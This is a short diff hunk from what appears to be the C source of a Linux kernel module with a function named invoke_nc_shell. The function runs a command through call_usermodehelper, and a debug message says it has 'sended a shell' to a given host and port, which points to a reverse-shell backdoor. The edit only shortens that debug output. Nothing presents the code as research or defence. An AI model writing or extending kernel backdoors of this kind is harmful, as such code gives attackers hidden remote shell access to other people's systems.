@@ -39,8 +39,7 @@ void invoke_nc_shell(char *argv[]) {
   call_usermodehelper(shell[0], shell, envp, UMH_WAIT_EXEC);
 
 #ifdef DEBUG
-  printk(KERN_INFO "sended a shell to %s on port %s\n%s\n", argv[0], argv[1],
-         shell_cmd);
+  printk(KERN_INFO "sended a shell to %s on port %s\n", argv[0], argv[1]);
 #endif
 }
 
